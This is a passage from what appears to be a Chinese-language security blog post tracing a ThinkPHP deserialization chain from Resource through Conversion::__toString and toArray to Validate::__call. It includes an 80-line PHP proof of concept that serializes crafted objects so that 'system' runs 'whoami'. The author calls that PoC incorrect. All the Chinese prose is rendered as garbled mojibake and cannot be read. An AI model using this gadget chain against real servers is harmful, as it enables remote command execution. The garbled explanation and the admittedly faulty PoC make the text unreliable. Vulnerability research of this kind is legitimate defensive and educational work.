</div><p>ÂÖ∂ÂÆûËøôÈáåÂ∞±ËÉΩÂ∞ùËØïË∞ÉÁî®<code>__call()</code>ÊñπÊ≥ïÔºå‰ΩÜÊòØÂú®ÂâçÈù¢ÊÉ≥Ë¶ÅËøõË°åÂëΩ‰ª§ÊâßË°åÁöÑÂú∞ÊñπÔºåÊòØÈúÄË¶ÅÂú®Ë∞ÉÁî®<code>__call()</code>ÊñπÊ≥ïÊó∂ÊòØÈúÄË¶ÅÊúâÂèÇÊï∞ÁöÑÔºå‰ΩÜÊòØËøôÈáåÁöÑ<code>getRule()</code>ÊñπÊ≥ïÊòØÊó†Ê≥ïËøõË°å‰º†ÂèÇÁöÑ„ÄÇ</p>
<p>ËøòÊòØÁõ¥Êé•Ë∑üËøõÔºåË∞ÉÁî®ÁöÑgetRule()ÊñπÊ≥ï‰ºöË∞ÉÁî®Âà∞Resource.phpÊñá‰ª∂ÁöÑÁà∂Á±ªÁöÑÁà∂Á±ªRuleÁ±ªÁöÑgetRule()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getRule</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâÄ‰ª•ËøôÈáåÁöÑÂèÇÊï∞ÊòØÂèØÊéßÁöÑ„ÄÇ</p>
<p>ÁÑ∂ÂêéÁúã‰∏Ä‰∏ãparseGroupRule()ÊñπÊ≥ïÔºå‰ºöË∞ÉÁî®Âà∞Resource.phpÊñá‰ª∂ÁöÑparseGroupRule()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061655846.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306165556758"
	
	
></p>
<p>Â¶Ç‰∏äÂõæÔºåÈÄöËøáÂèÇÊï∞ÁöÑÊéßÂà∂ÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Ë∑≥ËøáÁ¨¨‰∏Ä‰∏™ifËØ≠Âè•ÁöÑÊâßË°åÔºåÁõ¥Êé•ÊâßË°åÂêéÈù¢ÁöÑ‰ª£Á†ÅÔºåÁÑ∂ÂêéÁúãÁ¨¨‰∫å‰∏™Ê°ÜÂá∫Êù•ÁöÑÈÉ®ÂàÜÔºåÂèØ‰ª•ÁúãËßÅÂæàÊòéÊòæÁöÑÊãºÊé•Êìç‰ΩúÔºåËøôÈáåÊòØÂèØ‰ª•Â∞ùËØïË∞ÉÁî®toStringÈìæÁöÑÔºåËøôÈáåÂÜçÁÆÄÂçïÁúã‰∏Ä‰∏ãËøôÈáåÁöÑÂèÇÊï∞ÊÉÖÂÜµÔºåÁúãÊòØÂê¶ÂèØ‰ª•ÊéßÂà∂ÔºåÂÆ°ËÆ°‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞ÊòØÂèØ‰ª•ÊéßÂà∂ÁöÑÔºåÂÖ∑‰ΩìÂ∞±ÁúãÂêéÈù¢ÁöÑPOCÂêßÔºåÁªßÁª≠ÊâæÈìæÂ≠ê„ÄÇ„ÄÇ</p>
<p>Áé∞Âú®Â∞±ÊòØÈúÄË¶ÅÂéªÊâæË∞ÉÁî®toString()ÈìæÂ≠êÔºåËøôÈáåÈÄâÁî®ÁöÑÊòØthink\model\concern\ConversionÁ±ªÁöÑ<code>__toString()</code>ÈìæÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061713534.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171339466"
	
	
></p>
<p>Ë∑üËøõËøô‰∏™toJson()Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061714193.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171400136"
	
	
></p>
<p>ÁÑ∂ÂêéË∞ÉÁî®toArray()Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">toArray</span><span class="p">()</span><span class="o">:</span> <span class="k">array</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$hasVisible</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">str_contains</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="p">[</span><span class="nv">$relation</span><span class="p">,</span> <span class="nv">$name</span><span class="p">]</span>    <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$visible</span><span class="p">[</span><span class="nv">$relation</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$visible</span><span class="p">[</span><span class="nv">$val</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$hasVisible</span>    <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$visible</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">str_contains</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="p">[</span><span class="nv">$relation</span><span class="p">,</span> <span class="nv">$name</span><span class="p">]</span>   <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$hidden</span><span class="p">[</span><span class="nv">$relation</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$hidden</span><span class="p">[</span><span class="nv">$val</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$hidden</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// ËøΩÂä†Â±ûÊÄßÔºàÂøÖÈ°ªÂÆö‰πâËé∑ÂèñÂô®Ôºâ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">appendAttrToArray</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">..............</span><span class="nx">Á≠â‰ª£Á†Å</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">       
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáå‰∏ªË¶Å‰∏ªË¶ÅÂ∞±ÊòØË¶ÅË∞ÉÁî®ÊúÄÂêéÁöÑappendAttrToArray()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061716303.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171611230"
	
	
></p>
<p>ÁÑ∂ÂêéË∞ÉÁî®ËøôÈáåÁöÑgetRelationWith()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061716162.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306171651095"
	
	
></p>
<p>ËøôÈáåÂ∞±ÂèØ‰ª•Ëß¶Âèë<code>__call()</code>ÊñπÊ≥ïÔºåÂØπ‰∫éÂèÇÊï∞ÁöÑ‰º†ÈÄíÔºåÂÖ∂ÂÆû‰∏çÈöæÔºå‰ΩÜÊòØÊúâ‰∏Ä‰∏™ÁÇπÊ≤°ÊÉ≥ÊòéÁôΩÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061723540.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306172323463"
	
	
></p>
<p>ËøôÈáåÁöÑrule‰ºöÊòØ‰ªÄ‰πàÔºüÈóÆÊàë‰º†ÂèÇÊó∂Âπ∂Ê≤°Êúâ‰º†Ëøô‰∏™ÂèÇÊï∞ÔºåÂÖàÁÆÄÂçïÊûÑÈÄ†ÁúãÁúãËøôÈáåÁöÑÂèÇÊï∞ÊòØ‰ªÄ‰πà„ÄÇ</p>
<h5 id="expÊûÑÈÄ†">expÊûÑÈÄ†
</h5><h6 id="ÈóÆÈ¢òËØ¥Êòé">ÈóÆÈ¢òËØ¥Êòé
</h6><p>ËøôÈáåÁöÑÂèÇÊï∞ËØ¥ÊòéÂ∞±‰∏çÂÖ∑‰ΩìËØ¥Êòé‰∫ÜÔºåÁõ¥Êé•ÊûÑÈÄ†Âç≥ÂèØÔºåÂÆûÂú®ÊÉ≥‰∏çÂá∫ÁöÑÊó∂ÂÄôÂèØ‰ª•ÂÜçÁúãÁúãPÊàëÊûÑÈÄ†Âá∫Êù•ÁöÑPOCÔºåËøôÈáåÊúâÂá†‰∏™ÁÇπÈúÄË¶ÅËØ¥Êòé‰∏Ä‰∏ãÔºö</p>
<p><strong>1.</strong></p>
<p>Âú®ÂâçÈù¢ÁöÑÈìæÂ≠êÊâæÂØªËøáÁ®ã‰∏≠ÔºåÂèØ‰ª•Áü•ÈÅìÈìæÂ≠êÂÖ∂‰∏≠‰∏Ä‰∏™ÊòØtraitÁ±ªÂûãÁöÑConversionÁ±ªÔºåÊòØ‰ª£Á†ÅÂ§çÁî®Á±ªÂûãÁöÑÔºå‰∏çËÉΩÁõ¥Êé•ÂÆû‰æãÂåñÊù•‰ΩøÁî®Ôºå‰ΩÜÊòØÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®Âà∞‰ªñÁöÑ<code>__toString()</code>ÊñπÊ≥ïÔºåÊÄé‰πàÂà©Áî®Âë¢ÔºåËá™Â∑±ÊûÑÈÄ†ÁöÑÊó∂ÂÄô‰πüÊòØÂú®ConversionÁ±ª‰∏≠Êúâ‰∏Ä‰∏™Âêë‰∏ãÊâæÁöÑÊåâÈíÆÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061802638.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306180236572"
	
	
></p>
<p>ÂæÄ‰∏ãË∑≥ÔºåÂà∞‰∫ÜModelÊäΩË±°Á±ª:</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061806122.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306180629060"
	
	
></p>
<p>ÂÜçÂæÄ‰∏ãÂ∞±Âà∞‰∫ÜPivotÁ±ªÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061806263.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306180654204"
	
	
></p>
<p>Ëøô‰∏™Á±ªÂ∞±ÊòØÂèØ‰ª•Áõ¥Êé•ÂÆû‰æãÂåñÊù•‰ΩøÁî®ÁöÑÔºåÊâÄ‰ª•ÊúÄÂêéÊàë‰ª¨Ë¶Å‰ΩøÁî®ÁöÑÁ±ªÂ∞±ÊòØËøô‰∏™Á±ª„ÄÇ</p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<p><strong>2.</strong></p>
<p>ËøòÊúâ‰∏™Â∞±ÊòØÂâçÈù¢ÈÅóÁïôÁöÑ<code>$rule</code>ÂèÇÊï∞ÈóÆÈ¢òÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062204633.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306220415567"
	
	
></p>
<p>ÊûúÁÑ∂ËøòÊòØË∞ÉËØï‰∏Ä‰∏ãÂ∞±Áü•ÈÅì‰∫ÜÔºåËøôÈáåÁöÑ<code>$rule</code>ÂèòÈáèÁöÑÂÄºÊòØ<code>visible</code>ÔºåÂêéÈù¢ÁÆÄÂçïËØ¥ËØ¥ÊòØÊÄé‰πàËøõË°åÁöÑÔºö</p>
<p>Âú®<code>__call</code>ÊñπÊ≥ï‰∏≠ÔºåËß¶ÂèëÁöÑÁÇπÊòØvisible()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062206931.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306220625866"
	
	
></p>
<p>ÊâÄ‰ª•Â¶Ç‰∏ã<code>__call</code>Ê∫êÁ†ÅÔºåËøôÈáå‰ºöÁõ¥Êé•Â∞ÜËøô‰∏™<code>$method</code>ÁöÑÂÄºÁõ¥Êé•push‰∏äÊï∞ÁªÑ‰∏≠Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062207361.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306220759296"
	
	
></p>
<p>ËÆ©ÁÑ∂ÂêéÂú®Ë∞ÉÁî®is()ÂáΩÊï∞Êó∂ÔºåÂØπ‰∫é<code>$value</code>Âíå<code>$rule</code>ÁöÑÂÄºÔºåÂ∞±ÊòØÊï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÄºÂíåÁ¨¨‰∫å‰∏™ÂÄº„ÄÇ</p>
<p><strong>3.</strong></p>
<p>ÊúÄÈáçË¶ÅÁöÑ‰∏ÄÁÇπÔºåniviaÂ∏àÂÇÖtqlÔºå‰πüÊòØÊàëÂç°‰ΩèÁöÑ‰∏ÄÁÇπÔºåÂØºËá¥Ëøô‰∏ÄÊ≠•Ê≤°ÊûÑÈÄ†Âá∫POCÔºåÁÆÄÂçïË¥¥‰∏Ä‰∏ãÊàëÁöÑÂéüÊú¨<strong>ÈîôËØØÁöÑ</strong>POCÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Validate</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$type</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;visible&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Route</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$relation</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;fupanc.whoami&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;113&#39;</span><span class="o">=&gt;</span><span class="k">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc.111111&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\Validate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Resource</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$option</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rest</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$router</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\Route</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;var&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\model\Pivot</span><span class="p">()],</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rest</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&#34;111&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;id&gt;&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ResourceRegister</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$registered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$resource</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\Resource</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\ResourceRegister</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•Âä®ÊÄÅÁîüÊàêË∞ÉËØï‰∏Ä‰∏ã„ÄÇ</p>
<p>Â∞±ÁÆÄÂçïËØ¥ËØ¥ËøôÈáåÁöÑÂ∑ÆÈîôÁÇπÔºö</p>
<p>ÂêåÊ†∑ÁöÑÔºåÊàë‰πüÊòØÂÖ≥Ê≥®Âà∞‰∫ÜÂú®toArray()ÊñπÊ≥ï‰∏≠ÁöÑÂØπ<code>$this-&gt;visible</code>ÁöÑÂàÜÂâ≤ÔºåÂêåÊ†∑ÁöÑÊúÄÂºÄÂßãÊûÑÈÄ†ÊòØÊòØÊÉ≥Ë¶ÅÂà©Áî®elseËØ≠Âè•‰∏≠ÁöÑ‰ª£Á†ÅÂùóÊù•ËøõË°åËµãÂÄºÊìç‰ΩúÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062216565.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306221632496"
	
	
></p>
